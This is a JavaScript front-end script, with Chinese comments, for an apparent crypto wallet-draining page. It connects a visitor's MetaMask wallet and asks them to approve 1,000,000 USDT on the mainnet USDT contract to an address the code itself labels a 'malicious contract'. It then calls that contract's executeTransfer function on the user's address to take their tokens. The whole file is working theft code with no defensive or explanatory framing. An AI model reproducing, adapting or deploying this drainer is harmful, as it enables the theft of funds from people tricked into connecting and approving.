// USDT 合约 ABI
const usdtAbi = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) external view returns (uint256)"
];

// 恶意合约 ABI
const maliciousAbi = [
    "function executeTransfer(address user) external"
];

// 合约地址
const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 主网合约地址
const maliciousContractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 恶意合约地址

let provider;
let signer;
let userAddress;

document.getElementById("connectButton").onclick = async () => {
    console.log("Connect button clicked"); // 调试信息
    try {
        if (typeof window.ethereum !== 'undefined') {
            console.log("MetaMask is installed"); // 检查 MetaMask
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            console.log("User address:", userAddress); // 输出用户地址
            document.getElementById("message").innerText = "Connected: " + userAddress;
            document.getElementById("approveButton").disabled = false; // 启用批准按钮
        } else {
            console.log("MetaMask is not installed"); // 如果没有安装
            document.getElementById("message").innerText = "Please install MetaMask!";
        }
    } catch (error) {
        console.error("Error connecting wallet:", error);
        document.getElementById("message").innerText = "Failed to connect wallet.";
    }
};

document.getElementById("approveButton").onclick = async () => {
    console.log("Approve button clicked"); // 调试信息
    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
    const amount = ethers.utils.parseUnits("1000000", 6); // 1000000 USDT (6 位小数)

    try {
        const tx = await usdtContract.approve(maliciousContractAddress, amount);
        console.log("Transaction sent:", tx); // 交易信息
        await tx.wait();
        console.log("Transaction confirmed"); // 交易确认
        document.getElementById("message").innerText = "Approval successful!";
        document.getElementById("executeTransferButton").disabled = false; // 启用执行转移按钮
    } catch (error) {
        console.error("Approval error:", error);
        document.getElementById("message").innerText = "Approval failed!";
    }
};

document.getElementById("executeTransferButton").onclick = async () => {
    console.log("Execute Transfer button clicked"); // 调试信息
    const maliciousContract = new ethers.Contract(maliciousContractAddress, maliciousAbi, signer);

    try {
        const tx = await maliciousContract.executeTransfer(userAddress);
        console.log("Transfer transaction sent:", tx); // 交易信息
        await tx.wait();
        console.log("Transfer transaction confirmed"); // 交易确认
        document.getElementById("message").innerText = "Transfer executed!";
    } catch (error) {
        console.error("Transfer error:", error);
        document.getElementById("message").innerText = "Transfer failed!";
    }
};
